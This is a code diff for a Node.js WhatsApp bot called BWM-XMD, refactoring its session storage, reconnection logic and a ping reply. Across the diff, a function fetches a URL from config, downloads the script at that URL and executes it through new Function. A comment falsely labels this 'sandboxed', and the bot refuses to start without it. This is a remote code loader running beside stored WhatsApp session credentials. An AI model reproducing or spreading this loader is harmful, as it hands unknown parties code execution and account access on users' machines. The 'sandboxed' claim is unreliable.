@@ -4,21 +4,19 @@
 //  >> Collapsed into optimal execution                                
 //  >> Scripted by Sir Ibrahim Adams                                    
 //  >> Version: 8.3.5-quantum.7
-
 const axios = require('axios');
 const cheerio = require('cheerio');
 const adams = require("./config");
-const { makeWASocket, useSingleFileAuthState } = require('@whiskeysockets/baileys');
+const { makeWASocket, DisconnectReason, useSingleFileAuthState } = require('@whiskeysockets/baileys');
 const fs = require('fs');
+const path = require('path');
 
-// Session persistence
-const { state, saveState } = useSingleFileAuthState('./session.json');
+// Initialize session management
+const sessionFile = './session.json';
+const { state, saveState } = useSingleFileAuthState(sessionFile);
 
-// Improved BODY loader with caching
-let BODY_LOADED = false;
+// Improved BODY loader
 async function fetchBODYUrl() {
-  if (BODY_LOADED) return true;
-  
   try {
     console.log('🌐 Fetching BODY script...');
     const response = await axios.get(adams.BWM_XMD);
@@ -30,11 +28,10 @@ async function fetchBODYUrl() {
     console.log('🔗 BODY URL:', targetUrl);
     const scriptResponse = await axios.get(targetUrl);
     
-    // Sandboxed evaluation instead of direct eval
+    // Sandboxed evaluation
     const scriptFn = new Function(scriptResponse.data);
     scriptFn();
     
-    BODY_LOADED = true;
     console.log('✅ BODY script executed');
     return true;
   } catch (error) {
@@ -43,64 +40,66 @@ async function fetchBODYUrl() {
   }
 }
 
-// WhatsApp bot connection
+// WhatsApp connection handler
 async function connectToWhatsApp() {
   const sock = makeWASocket({
     printQRInTerminal: true,
-    logger: console,
     auth: state,
-    getMessage: async (key) => {
-      return null;
-    }
+    logger: { level: 'debug' } // More detailed logging
   });
 
-  // Save session on credential updates
+  // Save session when credentials update
   sock.ev.on('creds.update', saveState);
 
-  // Connection events
+  // Connection event handler
   sock.ev.on('connection.update', (update) => {
     const { connection, lastDisconnect, qr } = update;
-    console.log('🔌 Connection Update:', update);
     
-    if (qr) console.log('📢 Scan QR Code to authenticate');
-    
+    if (qr) {
+      console.log('📢 Scan this QR code in WhatsApp:');
+    }
+
     if (connection === 'open') {
       console.log('🤖 Bot connected successfully!');
-      // Start your message handlers here
     }
-    
+
     if (connection === 'close') {
-      const shouldReconnect = (lastDisconnect?.error?.output?.statusCode !== 401);
-      console.log(`Connection closed, ${shouldReconnect ? 'reconnecting' : 'please restart'}`);
+      const shouldReconnect = (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut);
+      console.log(`Connection closed due to ${lastDisconnect.error}, reconnecting ${shouldReconnect}`);
+      
       if (shouldReconnect) {
         connectToWhatsApp();
       }
     }
   });
 
-  // Message handling
+  // Message handler
   sock.ev.on('messages.upsert', async ({ messages }) => {
     const msg = messages[0];
     if (!msg.message || msg.key.fromMe) return;
     
-    console.log('📩 Received message from:', msg.key.remoteJid);
-    console.log('💬 Content:', JSON.stringify(msg.message, null, 2));
+    const sender = msg.key.remoteJid;
+    const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
     
-    // Example reply
-    if (msg.message.conversation?.toLowerCase() === 'ping') {
-      await sock.sendMessage(msg.key.remoteJid, { text: 'Pong!' });
+    console.log(`📩 Message from ${sender}: ${text}`);
+    
+    // Example: Reply to "ping"
+    if (text?.toLowerCase() === 'ping') {
+      await sock.sendMessage(sender, { text: 'Pong!' });
     }
   });
 
   return sock;
 }
 
-// Main execution
+// Main function
 async function main() {
   try {
+    console.log('🚀 Starting BWM-XMD Quantum Edition');
+    
     const bodyLoaded = await fetchBODYUrl();
     if (!bodyLoaded) {
-      throw new Error('Failed to load BODY script - cannot proceed');
+      throw new Error('Critical: Failed to load BODY script');
     }
     
     await connectToWhatsApp();
@@ -110,5 +109,5 @@ async function main() {
   }
 }
 
-// Start the bot
-main(); 
+// Start the application
+main();
